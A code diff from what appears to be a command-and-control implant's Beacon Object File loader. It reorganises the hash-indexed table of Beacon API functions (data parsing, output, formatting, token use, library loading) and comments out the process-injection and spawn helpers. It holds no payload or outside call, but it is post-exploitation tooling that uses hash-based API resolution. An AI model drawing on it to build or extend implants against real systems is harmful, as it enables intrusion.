@@ -17,12 +17,25 @@ void InitBofOutputData()
 	}
 }
 
-BOF_API BeaconFunctions[33] = {
+#define BEACON_FUNCTIONS_COUNT 22
+
+BOF_API BeaconFunctions[BEACON_FUNCTIONS_COUNT] = {
+
+	/// 5 - Data Parser API
+
 	{ HASH_FUNC_BEACONDATAPARSE,              BeaconDataParse },
 	{ HASH_FUNC_BEACONDATAINT,                BeaconDataInt },
 	{ HASH_FUNC_BEACONDATASHORT,              BeaconDataShort },
 	{ HASH_FUNC_BEACONDATALENGTH,             BeaconDataLength },
 	{ HASH_FUNC_BEACONDATAEXTRACT,            BeaconDataExtract },
+
+	/// 2 - Output API
+
+	{ HASH_FUNC_BEACONOUTPUT,                 BeaconOutput },
+	{ HASH_FUNC_BEACONPRINTF,                 BeaconPrintf },
+
+	/// 7 - Format API
+
 	{ HASH_FUNC_BEACONFORMATALLOC,            BeaconFormatAlloc },
 	{ HASH_FUNC_BEACONFORMATRESET,            BeaconFormatReset },
 	{ HASH_FUNC_BEACONFORMATAPPEND,           BeaconFormatAppend },
@@ -30,21 +43,25 @@ BOF_API BeaconFunctions[33] = {
 	{ HASH_FUNC_BEACONFORMATTOSTRING,         BeaconFormatToString },
 	{ HASH_FUNC_BEACONFORMATFREE,             BeaconFormatFree },
 	{ HASH_FUNC_BEACONFORMATINT,              BeaconFormatInt },
-	{ HASH_FUNC_BEACONOUTPUT,                 BeaconOutput },
-	{ HASH_FUNC_BEACONPRINTF,                 BeaconPrintf },
+
+	/// 3 - Internal APIs
+
 	{ HASH_FUNC_BEACONUSETOKEN,               BeaconUseToken },
 	{ HASH_FUNC_BEACONREVERTTOKEN,            BeaconRevertToken },
-	{ HASH_FUNC_BEACONISADMIN,                BeaconIsAdmin },
-	{ HASH_FUNC_BEACONGETSPAWNTO,             BeaconGetSpawnTo },
-	{ HASH_FUNC_BEACONINJECTPROCESS,          BeaconInjectProcess },
-	{ HASH_FUNC_BEACONINJECTTEMPORARYPROCESS, BeaconInjectTemporaryProcess },
-	{ HASH_FUNC_BEACONSPAWNTEMPORARYPROCESS,  BeaconSpawnTemporaryProcess },
-	{ HASH_FUNC_BEACONCLEANUPPROCESS,         BeaconCleanupProcess },
+	//{ HASH_FUNC_BEACONISADMIN,                BeaconIsAdmin },
+	//{ HASH_FUNC_BEACONGETSPAWNTO,             BeaconGetSpawnTo },
+	//{ HASH_FUNC_BEACONSPAWNTEMPORARYPROCESS,  BeaconSpawnTemporaryProcess },
+	//{ HASH_FUNC_BEACONINJECTPROCESS,          BeaconInjectProcess },
+	//{ HASH_FUNC_BEACONINJECTTEMPORARYPROCESS, BeaconInjectTemporaryProcess },
+	//{ HASH_FUNC_BEACONCLEANUPPROCESS,         BeaconCleanupProcess },
 	{ HASH_FUNC_TOWIDECHAR,					  toWideChar },
-	{ HASH_FUNC_BEACONINFORMATION,            BeaconInformation },
-	{ HASH_FUNC_BEACONADDVALUE,               BeaconAddValue },
-	{ HASH_FUNC_BEACONGETVALUE,               BeaconGetValue },
-	{ HASH_FUNC_BEACONREMOVEVALUE,            BeaconRemoveValue },
+	//{ HASH_FUNC_BEACONINFORMATION,            BeaconInformation },
+	//{ HASH_FUNC_BEACONADDVALUE,               BeaconAddValue },
+	//{ HASH_FUNC_BEACONGETVALUE,               BeaconGetValue },
+	//{ HASH_FUNC_BEACONREMOVEVALUE,            BeaconRemoveValue },
+
+	/// 5 - Other APIs
+
 	{ HASH_FUNC_LOADLIBRARYA,                 proxy_LoadLibraryA },
 	{ HASH_FUNC_GETMODULEHANDLEA,             proxy_GetModuleHandleA },
 	{ HASH_FUNC_FREELIBRARY,                  proxy_FreeLibrary },
@@ -56,7 +73,7 @@ void* FindProcBySymbol(char* symbol)
 {
 	if ( StrLenA(symbol) > IMP_LENGTH) {
 		ULONG funcHash = Djb2A((PUCHAR) symbol + IMP_LENGTH);
-		for (int i = 0; i < 33; i++) { // BeaconFunctionsCount
+		for (int i = 0; i < BEACON_FUNCTIONS_COUNT; i++) { // BeaconFunctionsCount
 			if (funcHash == BeaconFunctions[i].hash) {
 				if ( BeaconFunctions[i].proc != NULL ) 
 					return BeaconFunctions[i].proc;
